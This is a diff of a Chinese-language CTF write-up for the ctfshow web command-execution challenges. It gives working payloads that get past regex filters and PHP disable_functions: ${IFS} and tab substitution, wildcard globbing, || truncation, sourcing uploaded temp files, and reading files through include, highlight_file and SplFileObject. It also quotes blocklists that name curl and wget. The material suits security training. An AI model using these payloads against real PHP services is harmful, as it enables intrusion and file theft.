@@ -53,7 +53,7 @@ if(isset($_GET['c'])){
 | `/dev/null` | Linux 的“黑洞”文件，写进去的内容全部丢弃 |
 | `2>&1` | 把标准错误（stderr，fd=2）也重定向到 stdout |
 
-合起来：**这条命令的所有输出（正常输出 + 报错）都被丢掉了**，页面上什么都看不到。
+合起来：**这条命令的所有输出（正常输出 + 报错）都被丢掉了** ，页面上什么都看不到。
 
 所以直接传 `cat flag.php`，实际执行的是：
 
@@ -77,7 +77,7 @@ tac flag.php; >/dev/null 2>&1
 
 ![image-20261107095040501](/assets/ctfshow-web-command-exec/image-20261107095040501.png)
 
-- `;` 是 shell 的**命令分隔符**，前面 `tac flag.php` 是第一条命令
+- `;` 是 shell 的**命令分隔符** ，前面 `tac flag.php` 是第一条命令
 - 后面 `>/dev/null 2>&1` 成了第二条“空命令”，只做重定向，什么都不输出
 - 于是 `tac` 的输出正常回显
 
@@ -139,7 +139,7 @@ if(!preg_match("/\;|cat/i", $c)){
 | 核心障碍 | 追加的 `>/dev/null 2>&1` | 同左 + 两个禁词 |
 | 关键解法 | `;` 截断 | `\|\|` / `&&` / `#` 截断；`tac` 代替 `cat` |
 
-只要能让“我们自己的命令”和“追加的重定向”**分开成两条命令**，输出就不会被吞。
+只要能让“我们自己的命令”和“追加的重定向”**分开成两条命令** ，输出就不会被吞。
 
 ### web44
 
@@ -203,7 +203,7 @@ if(!preg_match("/\;|cat|flag| /i", $c)){
 | `${IFS}` | shell 内置变量，值是「空格 + Tab + 换行」 |
 | `$IFS$9` | 同理，`$9` 是空参数，用来断开变量名 |
 
-**注意**：`$IFS` 后面直接跟 `fla*` 会被当成变量名 `IFSfla`，要写成 `${IFS}` 或 `$IFS$9`。
+**注意** ：`$IFS` 后面直接跟 `fla*` 会被当成变量名 `IFSfla`，要写成 `${IFS}` 或 `$IFS$9`。
 
 #### 可用的 payload
 
@@ -244,9 +244,9 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
 
 #### 两个替代
 
-**空格 → `%09`（Tab）**：`$` 被封，`${IFS}` 用不了，但 Tab 还能用。
+**空格 → `%09`（Tab）** ：`$` 被封，`${IFS}` 用不了，但 Tab 还能用。
 
-**文件名 → `?` 通配符**：`*` 被封，但 `?` 还能用；`fla?.php` 匹配 `flag.php`，而且字符串里没有连续的 `flag`：
+**文件名 → `?` 通配符** ：`*` 被封，但 `?` 还能用；`fla?.php` 匹配 `flag.php`，而且字符串里没有连续的 `flag`：
 
 - `fla?.php` → `fla` + 任意一个字符 + `.php` → `flag.php`
 - 同类写法：`?lag.php`、`fl[a]g.php`
@@ -282,7 +282,7 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
 
 被封的都是“分页/排序”类命令，但 `tac`、`nl`、`od`、`grep`、`awk`、`sed`、`rev`、`paste`、`base64` 都还能用。
 
-所以 **web46 的 payload 原样可用**：
+所以 **web46 的 payload 原样可用** ：
 
 ```
 ?c=tac%09fla?.php||
@@ -339,7 +339,7 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk
 
 #### Q1：为什么 `%09` 还能用？
 
-这里有个容易误解的点：**过滤发生在 URL 解码之后**。
+这里有个容易误解的点：**过滤发生在 URL 解码之后** 。
 
 - 你提交的是 `%09`
 - PHP 取到 `$_GET['c']` 时，`%09` 已经被解码成了 **Tab 字符**
@@ -356,7 +356,7 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk
 
 #### 原理
 
-同 web48，只是多了个 `%` 的干扰项。关键是分清“原始输入”和“解码后的值”——**过滤器看的是解码后的值**。
+同 web48，只是多了个 `%` 的干扰项。关键是分清“原始输入”和“解码后的值”——**过滤器看的是解码后的值** 。
 
 ### web50
 
@@ -389,7 +389,7 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk
 
 但有个坑：**`<` 后面的通配符 `fla?.php` 不会展开**（容器的 `/bin/sh` 是 dash，重定向目标不做 glob 展开），会报“文件不存在”。
 
-所以文件名要写成**字面量**，但又不能出现连续的 `flag`。两个办法：
+所以文件名要写成**字面量** ，但又不能出现连续的 `flag`。两个办法：
 
 ```
 ?c=tac<fla\g.php||     ← 反斜杠：shell 去掉 \，还原成 flag.php
@@ -400,11 +400,7 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk
 
 #### 为什么最后要 `||`
 
-代码会在末尾拼 ` >/dev/null 2>&1`。`||` 让这段重定向变成**另一条命令**，我们自己的 `tac` 输出才不会被吞。
-
-
-
-
+代码会在末尾拼 ` >/dev/null 2>&1`。`||` 让这段重定向变成**另一条命令** ，我们自己的 `tac` 输出才不会被吞。
 
 ### web51
 
@@ -452,28 +448,18 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk
 }
 ```
 
-- 和 web51 相比：**去掉了 `$` 的过滤**，但**新增 `>` 和 `<`**
-- 也就是：`${IFS}` 复活了，但 `<` 重定向不能用了
+- 和 web51 相比：**去掉了 `$` 的过滤** ，但**新增 `>` 和 `<`**
+- 也就是：`${IFS}` 还能继续使用，但 `<` 重定向不能用了
 
-#### 思路：回到 `${IFS}` + `?` 通配符
+#### 思路：使用 `${IFS}` + `?` 通配符
 
 - 空格仍被封 → `${IFS}` 代替（`$` 不再被封）
-- `*` 仍被封 → `?` 通配符（这次是普通参数，dash 会正常展开）
+- `*` 仍被封 → `?` 通配符（这是普通参数，dash 会正常展开）
 - `tac` 仍被封 → `nl` / `rev` / `paste`
-- `<` `>` 被封 → 不能用重定向，只能走“命令 + 参数”的老路
+- `<` `>` 被封 → 不能用重定向，就只能走“命令 + 参数”
 - `||` 还能用 → 截断后面追加的 `>/dev/null 2>&1`
 
-#### payload
-
-```
-?c=nl${IFS}fla?.php||
-?c=rev${IFS}fla?.php||
-?c=paste${IFS}fla?.php||
-```
-
-#### 注意：flag.php 里是假的
-
-这题的 `flag.php` 内容是 `$flag="flag_here";`，占位符而已，真 flag 在根目录 `/flag`。
+#### 先查看根目录
 
 先看根目录：
 
@@ -481,15 +467,29 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk
 ?c=ls${IFS}/||
 ```
 
+![image-20261117095019577](/assets/ctfshow-web-command-exec/image-20261117095019577.png)
+
+#### payload
+
 根目录里有个 `flag` 文件，但 `flag` 这个词被过滤，不能直接写。用 `?` 绕：
 
 ```
 ?c=nl${IFS}/fla?||
+?c=rev${IFS}/fla?||
+?c=paste${IFS}/fla?||
 ```
 
 `/fla?` 匹配 `/flag`，字符串里没有连续的 `flag`，成功读出真 flag。
 
+![image-20261117095044048](/assets/ctfshow-web-command-exec/image-20261117095044048.png)
 
+![image-20261117095304723](/assets/ctfshow-web-command-exec/image-20261117095304723.png)
+
+
+
+
+
+![image-20261117095538207](/assets/ctfshow-web-command-exec/image-20261117095538207.png)
 
 ### web53
 
@@ -514,10 +514,7 @@ if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|ta
 ?c=nl${IFS}fla?.php
 ```
 
-#### 注意
-
-- 目录里除了 `flag.php`、`index.php`，还有一个 `readflag` 文件；但 `readflag` 里含 `flag`，直接写会返回 `no`
-- 想执行它可以用 `./readfla?`（`?` 通配），不过实测没有输出；拿 flag 直接用 `nl` 读 `flag.php` 就行
+![image-20261117100101010](/assets/ctfshow-web-command-exec/image-20261117100101010.png)
 
 ### web54
 
@@ -531,13 +528,13 @@ if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.
 }
 ```
 
-关键变化：
+变化：
 
 - 命令名不再按“整词”匹配，而是 `.*c.*a.*t.*` 这种**子序列**匹配——只要字符串里出现 c，后面再出现 a，再后面出现 t，就算命中
-- **不再追加 `>/dev/null 2>&1`**，`system($c)` 直接回显
+- **不再追加 `>/dev/null 2>&1`** ，`system($c)` 直接回显
 - 空格、Tab、`&`、`<` `>`、数字、`*`、反引号、`%` 仍然被封
 
-被封的常用词（按子序列）：cat、flag、more、wget、less、head、sort、tail、sed、cut、tac、awk、strings、od、curl、nl、scp、rm。
+被封的常用词：cat、flag、more、wget、less、head、sort、tail、sed、cut、tac、awk、strings、od、curl、nl、scp、rm。
 
 #### 能用哪些东西？
 
@@ -550,15 +547,28 @@ if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.
 - `$` 没被封 → `${IFS}` 当空格
 - 这次没有追加重定向 → 不需要 `||`
 
-#### payload
+#### payload1
 
 ```
 ?c=ls
-?c=paste${IFS}fla?.php
 ?c=rev${IFS}fla?.php
 ```
 
 `fla?.php` 里的 `?` 替代了 `g`：既破坏了 `flag` 这个子串，也破坏了 `f…l…a…g` 这个子序列，所以能过。
+
+![image-20261117100302616](/assets/ctfshow-web-command-exec/image-20261117100302616.png)
+
+#### payload2
+
+使用这一个payload在界面没有回显，但是查看源代码就能够看到flag
+
+```
+?c=paste${IFS}fla?.php
+```
+
+![image-20261117102146776](/assets/ctfshow-web-command-exec/image-20261117102146776.png)
+
+![image-20261117102200864](/assets/ctfshow-web-command-exec/image-20261117102200864.png)
 
 ### web55
 
@@ -631,7 +641,7 @@ if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
 #### 思路：`.`(source) + 文件上传的临时文件
 
 1. `.` 是 shell 的 source 命令（读入一个文件并执行），它不含任何字母
-2. PHP 处理文件上传时，会先把上传内容存成**临时文件**，命名类似 `/tmp/phpXXXXXX`（`php` + 6 位随机字符）
+2. PHP 处理文件上传时，会先把上传内容存成**临时文件** ，命名类似 `/tmp/phpXXXXXX`（`php` + 6 位随机字符）
 3. 这个临时文件在**本次请求处理期间是存在的**（请求结束才删除）
 4. 我们上传一个内容为 `cat flag.php` 的文件，同时让 `c` 去 source 这个临时文件
 
@@ -643,7 +653,7 @@ if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
 
 拼起来就是 `php` + 6 位随机字符（最后一位用大写字母过滤，提高命中率）。
 
-#### 复现步骤
+#### 步骤
 
 1. 本地建 `payload.txt`，内容：
    ```
@@ -722,7 +732,17 @@ print("c=$((%s))" % terms)
 
 #### 注意
 
-`#` 在 URL 里会被浏览器当成锚点，必须编码成 `%23`（curl 的 `--data-urlencode` 会自动处理）。这一步和 web49 的 `%09` 同理：**服务器先做 URL 解码，再做正则**，所以 `%23` 解码成 `#` 后照样能过。
+`#` 在 URL 里会被浏览器当成锚点，必须编码成 `%23`（curl 的 `--data-urlencode` 会自动处理）。这一步和 web49 的 `%09` 同理：**服务器先做 URL 解码，再做正则** ，所以 `%23` 解码成 `#` 后照样能过。
+
+### web58~65
+
+源码一模一样（POST + `eval($c)`，无 preg 过滤），只是 `disable_functions` 越来越长；**payload**是：
+
+```
+c=highlight_file('flag.php');
+```
+
+**题目自己要用的函数，出题人不会禁掉**——`highlight_file` 是那个一直留着的函数。次选是 `show_source`、`SplFileObject`、`glob` 这些“不在黑名单里”的语言。
 
 ### web58
 
@@ -739,7 +759,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-- **只收 POST**，没有任何 `preg_match`
+- **只收 POST** ，没有任何 `preg_match`
 - 但 `system()` 这类函数被 `disable_functions` 禁用：
 
 ```
@@ -816,7 +836,7 @@ Warning: file_get_contents() has been disabled for security reasons
 
 #### 一句话
 
-`disable_functions` 也是黑名单：**禁了 `system` 不等于禁了“读文件”，禁了 `file_get_contents` 也不等于禁了所有读法**。黑名单永远有漏。
+`disable_functions` 也是黑名单：**禁了 `system` 不等于禁了“读文件”，禁了 `file_get_contents` 也不等于禁了所有读法** 。黑名单永远有漏。
 
 ### web60
 
@@ -843,13 +863,11 @@ c=highlight_file('flag.php');
 
 直接出 flag。
 
-#### 为什么它一定没被禁
+#### Q1：为什么它没被禁？
 
-看题目自己的代码：`else{ highlight_file(__FILE__); }`——**它要靠 highlight_file 把源码显示给你看**。禁了它，题目页面都打不开。所以出题人不可能禁用这个函数。
+看题目自己的代码：`else{ highlight_file(__FILE__); }`——**它要靠 highlight_file 把源码显示给你看** 。禁了它，题目页面都打不开。所以出题人不可能禁用这个函数。
 
 同理，`show_source` 是它的别名，也可以用。
-
-
 
 ### web61
 
@@ -874,12 +892,12 @@ c=highlight_file('flag.php');
 | `SplFileObject` | `c=$f=new SplFileObject('flag.php');foreach($f as $l){echo $l;}` |
 | 列目录 | `c=print_r(glob('*'));` |
 
-- `SplFileObject` 是 SPL 的面向对象文件类，内部实现不走 `fopen` 这个**函数名**，所以黑名单管不到
+- `SplFileObject` 是 SPL 的面向对象文件类，内部实现不走 `fopen` 这个**函数名** ，所以黑名单管不到
 - `glob` 也没被禁，可以列目录确认文件名
 
 #### 一句话
 
-`disable_functions` 加到这份上，`highlight_file` 依然必须可用（题目自己要显示源码），所以 web58~61 四题其实是**同一条 payload**：
+`disable_functions` 加到这份上，`highlight_file` 依然必须可用（题目自己要显示源码），所以 web58~61 四题其实是**同一条 payload** ：
 
 ```
 c=highlight_file('flag.php');
@@ -893,7 +911,7 @@ c=highlight_file('flag.php');
 
 **禁用表扩充到 64 个**
 
-源码不变（POST + `eval($c)`），`disable_functions` 完整列表（实测 64 项）：
+源码不变（POST + `eval($c)`），`disable_functions` 完整列表：
 
 ```
 apache_child_terminate,apache_setenv,chgrp,chmod,chown,copy,curl_exec,
@@ -907,7 +925,7 @@ rename,serialize,shell_exec,symlink,syslog,system,tempnam
 
 注意：连 `error_reporting`、`error_log`、`file_put_contents`、`fwrite`、`fclose`、`fsockopen`、`curl_init` 都禁了。
 
-但 **`highlight_file` / `show_source` 依然不在名单里**：
+但 **`highlight_file` / `show_source` 依然不在名单里** ：
 
 ```
 c=highlight_file('flag.php');
@@ -915,92 +933,15 @@ c=highlight_file('flag.php');
 
 直接出 flag。
 
-#### 为什么这招永远有效
+#### Q1：为什么这个payload一直有用？
 
-题目自己的 `else` 分支就是 `highlight_file(__FILE__)`——禁了它，题目页面都打不开。
-
-
-
-### web63
-
-![image-20261107230420302](/assets/ctfshow-web-command-exec/image-20261107230420302.png)
-
-**只多禁了一个 `gc_collect_cycles`**
-
-web63 的禁用表 = web62 + `gc_collect_cycles`（共 65 个）。
-
-`gc_collect_cycles` 是经典的 `disable_functions` 绕过链（GC + 析构函数）里会用到的函数，出题人加它是在防“进阶绕过”。
-
-但本题根本用不上那么复杂——`highlight_file` 依然可用：
-
-```
-c=highlight_file('flag.php');
-```
-
-直接出 flag。
-
-#### 小结：web58~63 六题
-
-源码一模一样（POST + `eval($c)`，无 preg 过滤），只是 `disable_functions` 越来越长；解法始终是：
-
-```
-c=highlight_file('flag.php');
-```
-
-真正要记的是：**题目自己要用的函数，出题人不敢禁**——`highlight_file` 就是那个“必须留着”的函数。次选是 `show_source`、`SplFileObject`、`glob` 这些“不在黑名单里”的等价物。
-
-### web64
-
-![image-20261107232033721](/assets/ctfshow-web-command-exec/image-20261107232033721.png)
-
-**禁用表 66 项，多了一个 `getTrace`**
-
-源码不变。相比 web63，`disable_functions` 里多了一个 `getTrace`。
-
-- 注意：`getTrace` 不是全局函数（它是 `Exception::getTrace()` 方法），写进 `disable_functions` 其实没有实际作用
-- 这说明出题人在“照着绕过链的清单加函数”，连方法名也一起抄了进去
-
-`highlight_file` 还是能用：
-
-```
-c=highlight_file('flag.php');
-```
-
-> 小细节：用 `count(explode(',', ini_get('disable_functions')))` 会显示 68，是因为列表末尾还有逗号，`explode` 多算了一个空字符串；去重后的真实数量是 66。
-
-
-
-### web65
-
-![image-20261107232020716](/assets/ctfshow-web-command-exec/image-20261107232020716.png)
-
-**再禁一个 `debug_backtrace`**
-
-web65 = web64 + `debug_backtrace`（去重后 67 项）。
-
-`debug_backtrace` 是 `disable_functions` 绕过链（配合 GC、异常回溯等）里会用到的函数，出题人继续堵“进阶绕过”。
-
-但 `highlight_file` 依然不在名单里：
-
-```
-c=highlight_file('flag.php');
-```
-
-#### 小结：web58~65 八题
-
-源码完全一样，只是 `disable_functions` 一路加长，而且越加越“玄学”（连 `getTrace` 这种不是全局函数的名字都加进去了）。解法始终没变：
-
-```
-c=highlight_file('flag.php');
-```
-
-规律：**出题人必须保留自己题目要用的函数**（`highlight_file`），黑名单加得再长，这个洞永远在。
+题目自己的 `else` 分支就是 `highlight_file(__FILE__)`，禁了它，题目页面都打不开。你也就看不到php代码了。
 
 ### web66
 
 ![image-20261108094431393](/assets/ctfshow-web-command-exec/image-20261108094431393.png)
 
-**flag.php 是假的，还禁了 include/require/show_source**
+**flag不在flag.php 里，还禁了 include/require/show_source**
 
 源码不改。web66 的 `disable_functions` 在 web65 基础上新增：
 
@@ -1008,25 +949,19 @@ c=highlight_file('flag.php');
 include,include_once,require,require_once,show_source
 ```
 
-几个要点：
-
-- `include` / `require` 系列是**语言构造**，写进 `disable_functions` 其实禁不掉（PHP 手册明确说 disable_functions 只对函数有效）
-- `show_source` 是 `highlight_file` 的**别名**，这里只禁了别名，`highlight_file` 本体还在
+- `include` / `require` 系列是**语言构造** ，写进 `disable_functions` 其实禁不掉（PHP 手册明确说 disable_functions 只对函数有效）
+- `show_source` 是 `highlight_file` 的**别名** ，这里只禁了别名，`highlight_file` 本体还在
 - 去重后共 72 项
 
-#### 但 flag.php 是假的
+#### flag不在flag.php 里
 
 ```
-c=highlight_file('flag.php');
+c=highliht_file('flag.php');
 ```
 
-输出的是：
+![image-20261120155535729](/assets/ctfshow-web-command-exec/image-20261120155535729.png)
 
-```php
-$flag="秀秀得了,这次不在这里";
-```
-
-真 flag 不在 `flag.php`。
+没有显示出来，那么我们先看看目录里有些什么东西。
 
 #### 找真 flag：先列目录
 
@@ -1036,11 +971,13 @@ $flag="秀秀得了,这次不在这里";
 c=print_r(scandir('/'));
 ```
 
-根目录里能看到 `flag.txt`（真 flag 文件）。
+![image-20261120155630533](/assets/ctfshow-web-command-exec/image-20261120155630533.png)
+
+根目录里能看到 `flag.txt`，打开看看flag是不是在里面。
 
 #### 读 /flag.txt
 
-`file_get_contents`、`readfile`、`file`、`fopen` 全被禁了，但 `highlight_file` 还在，而且它**不限于 .php 文件**：
+`file_get_contents`、`readfile`、`file`、`fopen` 全被禁了，但 `highlight_file` 还在，而且它**不限于 .php 文件** ：
 
 ```
 c=highlight_file('/flag.txt');
@@ -1048,15 +985,13 @@ c=highlight_file('/flag.txt');
 
 直接出 flag。
 
-#### 一句话
-
-这题考两件事：①`show_source` 被禁不代表 `highlight_file` 被禁（别名和本体是两个名字）；②别只盯着 `flag.php`，发现内容不对就 `scandir` 列目录找真文件。
+![image-20261120155728594](/assets/ctfshow-web-command-exec/image-20261120155728594.png)
 
 ### web67
 
 ![image-20261108094859400](/assets/ctfshow-web-command-exec/image-20261108094859400.png)
 
-**flag.php 还是假的，`print_r`/`var_dump` 开始被禁**
+**`print_r`/`var_dump` 开始被禁**
 
 相比 web66，`disable_functions` 新增：
 
@@ -1064,21 +999,13 @@ c=highlight_file('/flag.txt');
 chr,fgetcsv,fscanf,print_r,pwn,str_repeat
 ```
 
-（去重后 78 项；`pwn` 不是 PHP 函数，又是个凑数的）
-
-#### 老问题：flag.php 是假的
-
-```
-c=highlight_file('flag.php');
-```
-
-输出 `$flag="秀秀得了,这次不在这里";`。
-
 #### `print_r` 被禁，用 `echo + implode` 列目录
 
 ```
 c=echo implode(' ',scandir('/'));
 ```
+
+![image-20261120160215044](/assets/ctfshow-web-command-exec/image-20261120160215044.png)
 
 输出：
 
@@ -1092,16 +1019,14 @@ c=echo implode(' ',scandir('/'));
 c=highlight_file('/flag.txt');
 ```
 
+![image-20261120160250087](/assets/ctfshow-web-command-exec/image-20261120160250087.png)
+
 出 flag。
 
-#### 为什么能绕
+#### Q1：为什么能绕？
 
 - `scandir`、`implode`、`echo` 都没被禁
-- `highlight_file` 也没被禁（这题只禁了 `print_r`、`var_dump` 这类"打印"函数，读文件的本体还在）
-
-
-
-
+- `highlight_file` 也没被禁（这题只禁了 `print_r`、`var_dump` 这类"打印"函数，读文件这个方法还能用）
 
 ### web68
 
@@ -1109,7 +1034,7 @@ c=highlight_file('/flag.txt');
 
 **比 web67 只多禁了一个 `highlight_file`**
 
-禁用表去重 79 项，和 web69 几乎一样（web69 是 85 项）。首页直接报：
+首页直接报：
 
 ```
 Warning: highlight_file() has been disabled for security reasons
@@ -1117,27 +1042,85 @@ Warning: highlight_file() has been disabled for security reasons
 
 源码显示不出来了，但 `eval($c)` 还在。
 
-#### 解法：include 语言构造
+#### Q1：为什么说源码显示不出来了，但 `eval($c)` 还在。怎么知道的？
+
+##### 1.页面只剩一行 warning ，说明源码是被 `highlight_file` 打出来的
+
+GET 首页，返回：
 
 ```
-c=include('/flag.txt');
+Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19
 ```
 
-出 flag。
+- 页面本来靠 `highlight_file(__FILE__)` 显示源码，这个函数被禁了，所以只剩 warning
+- warning 还泄露了两个信息：**函数名** `highlight_file`、**行号 19**——说明它就在 index.php 第 19 行（`else` 分支里）
 
-需要确认文件名的话，`scandir` 没被禁：
+##### 2.随便 POST 一段 PHP 能执行 → 说明 `eval` 分支还活着
+
+```
+c=echo 123;
+```
+
+![image-20261120161547491](/assets/ctfshow-web-command-exec/image-20261120161547491.png)
+
+响应：
+
+```
+123
+```
+
+`echo 123;` 被当成 PHP 代码执行了，说明 `if(isset($_POST['c']))` 这条分支还在跑；而能把字符串当代码执行的，只有 `eval` 这个语言构造。
+
+##### 3.直接把源码读回来
+
+`disable_functions` 禁的是**函数名** ，禁不了 SPL 类。所以用 `SplFileObject` 就能读 index.php：
+
+```
+c=$f=new SplFileObject("index.php");foreach($f as $l){echo $l;}
+```
+
+![image-20261120161647686](/assets/ctfshow-web-command-exec/image-20261120161647686.png)
+
+看着是空白的，但是查看源代码能够看到输出：
+
+![image-20261120161741373](/assets/ctfshow-web-command-exec/image-20261120161741373.png)
+
+```php
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+`eval($c);` 就在第 18 行，`else` 里的 `highlight_file(__FILE__)` 正好对应 warning 报的第 19 行
+
+（这题 `file_get_contents`、`readfile`、`fopen`、`highlight_file`、`show_source` 都被禁了，但 `SplFileObject` 和 `include` 都还能用。）
+
+
+#### 题解：确认文件名，`scandir` 没被禁：
 
 ```
 c=echo implode(' ',scandir('/'));
 ```
 
+![image-20261120160605760](/assets/ctfshow-web-command-exec/image-20261120160605760.png)
 
+#### include 语言构造
+
+```
+c=include('/flag.txt');
+```
+
+![image-20261120160634546](/assets/ctfshow-web-command-exec/image-20261120160634546.png)
 
 ### web69
 
 ![image-20261108094911427](/assets/ctfshow-web-command-exec/image-20261108094911427.png)
 
-**连 `highlight_file` 都禁了**
+**`highlight_file` 被禁了**
 
 相比 web66，新增：
 
@@ -1146,39 +1129,55 @@ chr,echo,fgetcsv,fscanf,ftruncate,highlight_file,
 move_uploaded_file,print,print_r,pwn,readline,str_repeat,var_dump
 ```
 
-（去重后 85 项）
-
 首页直接报：
 
 ```
 Warning: highlight_file() has been disabled for security reasons
 ```
 
-也就是说，出题人终于把"自己要用的函数"也禁了——页面因此**显示不了源码**，但 `eval($c)` 还在，POST 传 c 照样执行。
+出题人把`highlight_file`禁了，页面因此**显示不了源码** ，但 `eval($c)` 还在，POST 传 c 照样执行。
 
-#### 最后一招：`include` 禁不掉
+#### Q1：怎么知道禁了哪些函数？
 
-`include`/`require` 是**语言构造**，写进 `disable_functions` 完全没有效果（web66 已经验证过）。
+**payload：**
 
-而 `include` 一个**非 PHP 文件**时，会把它**原样输出**：
+```
+c=echo ini_get('disable_functions');
+```
+
+![image-20261120163044656](/assets/ctfshow-web-command-exec/image-20261120163044656.png)
+
+`ini_get` 本身没有被禁，它会把整个 `disable_functions` 原样打印出来：
+
+```
+fgetc,echo,var_dump,print,fopen,ftruncate,move_uploaded_file,symlink,readline,
+highlight_file,str_repeat,chr,print_r,fgetcsv,fscanf,pwn,show_source,
+include,include_once,require,require_once,debug_backtrace,getTrace,
+gc_collect_cycles,phpinfo,...,system,file_get_contents,error_reporting,
+file_put_contents,...,copy,rename,fopen,fgetc,serialize
+```
+
+- 开头那个 `echo` 明明写在黑名单里，却还能用来输出，是因为它是**语言构造** ，`disable_functions` 管不到（同理 `include`、`require`）
+- 备用输出：`c=printf("%s", ini_get("disable_functions"));`（`printf` 也能用；`phpinfo` 已被禁）
+
+
+#### `include` 没被禁掉
+
+`include`/`require` 是**语言构造** ，写进 `disable_functions` 没有用。
+
+而 `include` 一个**非 PHP 文件**时，会把它**原样输出** ：
 
 ```
 c=include('/flag.txt');
 ```
+
+![image-20261120162342868](/assets/ctfshow-web-command-exec/image-20261120162342868.png)
 
 直接出 flag。
 
-#### 注意一个很有意思的现象
+`echo`、`print` 写在 `disable_functions` 里，但 `c=echo ini_get('disable_functions');` 照样有输出说明**语言构造无法被 disable_functions 禁用** 。同理 `include`、`require`、`isset`、`empty` 这些也都是。
 
-`echo`、`print` 明明写在 `disable_functions` 里，但 `c=echo ini_get('disable_functions');` 照样有输出——再次证明**语言构造无法被 disable_functions 禁用**。同理 `include`、`require`、`isset`、`empty` 这些也都是。
-
-#### 一句话
-
-黑名单连 `highlight_file` 都封了，但**语言构造封不掉**。所以读文件的"最终保底"就是：
-
-```
-c=include('/flag.txt');
-```
+黑名单把 `highlight_file` 封了，但**语言构造封不掉** ，所以可以试试使用读文件这个方法解题。
 
 ### web70
 
@@ -1186,7 +1185,13 @@ c=include('/flag.txt');
 
 **警告刷屏，但 include 依然可用**
 
+**Q1：这段源码是怎么知道的？**
+
+自己看回 [web68-Q1-3.](#_3直接把源码读回来)，**用 `SplFileObject` 把整个 index.php 读回来** 。
+
 web70 的源码比前面多两行：
+
+![image-20261120170110590](/assets/ctfshow-web-command-exec/image-20261120170110590.png)
 
 ```php
 error_reporting(0);
@@ -1202,7 +1207,7 @@ if(isset($_POST['c'])){
 你要上天吗？
 ```
 
-而 `error_reporting`、`ini_set` 都在 `disable_functions` 里，于是页面顶部先刷两条警告（想关报错但关不掉），然后才执行我们的代码：
+而 `error_reporting`、`ini_set` 都在 `disable_functions` 里，于是页面顶部先刷两条警告，然后才执行我们的代码：
 
 ```
 Warning: error_reporting() has been disabled for security reasons ... line 14
@@ -1211,33 +1216,25 @@ Warning: highlight_file() has been disabled for security reasons ... line 21
 你要上天吗？
 ```
 
-禁用表去重 85 项，比 web68 多：`echo`、`print`、`var_dump`、`ftruncate`、`move_uploaded_file`、`readline`、`xml_parse`。
-
-#### 解法还是 include
+#### payload还是使用include
 
 ```
 c=include('/flag.txt');
 ```
 
-出 flag。
-
-#### 小技巧
-
-输出被警告糊住时，直接 `grep ctfshow` 从响应里捞；想确认源码结构，可以用 `SplFileObject` 读 `index.php`：
-
-```
-c=$f=new SplFileObject('index.php');foreach($f as $l){echo $l;}
-```
-
-
-
-
+![image-20261120164047036](/assets/ctfshow-web-command-exec/image-20261120164047036.png)
 
 ### web71
+
+![image-20261120170322774](/assets/ctfshow-web-command-exec/image-20261120170322774.png)
+
+![image-20261120170347408](/assets/ctfshow-web-command-exec/image-20261120170347408.png)
 
 **输出里的字母和数字会被替换成 `?`**
 
 源码（附件 `index.php`）：
+
+![image-20261120170242660](/assets/ctfshow-web-command-exec/image-20261120170242660.png)
 
 ```php
 error_reporting(0);
@@ -1266,33 +1263,23 @@ if(isset($_POST['c'])){
 
 #### 绕过：先关掉输出缓冲
 
-`ob_get_contents()` 只能拿到**当前缓冲区**里的内容。如果在 eval 里先执行 `ob_end_flush()` 把缓冲关掉，之后的输出会**直接发给客户端**，不再经过 `preg_replace`。
+`ob_get_contents()` 只能拿到**当前缓冲区**里的内容。如果在 eval 里先执行 `ob_end_flush()` 把缓冲关掉，之后的输出会**直接发给客户端** ，不再经过 `preg_replace`。
 
 ```
 c=ob_end_flush();include('/flag.txt');
 ```
 
+![image-20261120201648519](/assets/ctfshow-web-command-exec/image-20261120201648519.png)
+
 执行过程：
 
 1. `ob_end_flush()`：关闭当前输出缓冲，并把它刷出去（此时是空的）
-2. `include('/flag.txt')`：文件内容直接写进响应
+2. `include('/flag.txt')`：文件内容写进响应
 3. eval 结束后，脚本再调 `ob_get_contents()` 已经拿不到缓冲区，`preg_replace` 处理空内容，不影响我们
 
-#### 实测对照
-
-- `c=include('/flag.txt');` → flag 里的字母数字全变成 `?`
-- `c=ob_end_flush();include('/flag.txt');` → **直接出 flag**
-
-#### 顺便列目录也可以
-
-```
-c=ob_end_flush();echo implode(' ',scandir('/'));
-```
-
-> 页面顶部那两条 `error_reporting()/ini_set() has been disabled` 警告不用管，是 web70 那一批 disable_functions 的遗留，不影响 payload 执行。
-
-
 ### web73
+
+![image-20261120205206376](/assets/ctfshow-web-command-exec/image-20261120205206376.png)
 
 **去掉了 open_basedir，但读文件的函数还是全禁**
 
@@ -1300,13 +1287,119 @@ c=ob_end_flush();echo implode(' ',scandir('/'));
 
 但这题**没有设置 `open_basedir`**（`ini_get('open_basedir')` 为空），所以可以读根目录。
 
+#### Q1：这些结论是怎么确认的？
+
+##### 1.`open_basedir` 为空
+
+```
+c=ob_end_flush();printf("OB=[%s]", ini_get("open_basedir"));
+```
+
